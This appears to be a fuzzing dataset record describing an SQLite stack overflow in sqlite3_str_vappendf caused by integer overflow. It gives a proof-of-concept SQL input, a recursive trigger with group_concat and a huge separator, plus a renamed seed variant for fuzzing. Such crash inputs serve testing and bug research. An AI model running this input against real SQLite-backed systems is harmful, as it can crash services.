title: Stack overflow in sqlite3_str_vappendf, caused by int overflow
poc: CREATE TABLE a(b DOUBLE CHECK( NOT CASE WHEN printf(b, b) THEN 0 END) UNIQUE ON CONFLICT REPLACE);
CREATE TRIGGER c INSERT ON a BEGIN INSERT INTO a SELECT group_concat(b, 2147483647) FROM a;
INSERT INTO a(b, b, b) VALUES(NULL, 9, 3);
key_bug_features: CREATE TRIGGER c INSERT ON a BEGIN INSERT INTO a
bug_features_seed: CREATE TABLE fuzz_sqlite_a(b DOUBLE CHECK(NOT CASE WHEN printf(b, b) THEN 0 END) UNIQUE ON CONFLICT REPLACE);
CREATE TRIGGER fuzz_sqlite_c INSERT ON fuzz_sqlite_a BEGIN INSERT INTO fuzz_sqlite_a SELECT group_concat(b, 2147483647) FROM fuzz_sqlite_a; END;
INSERT INTO fuzz_sqlite_a(b, b, b) VALUES(NULL, 9, 3);
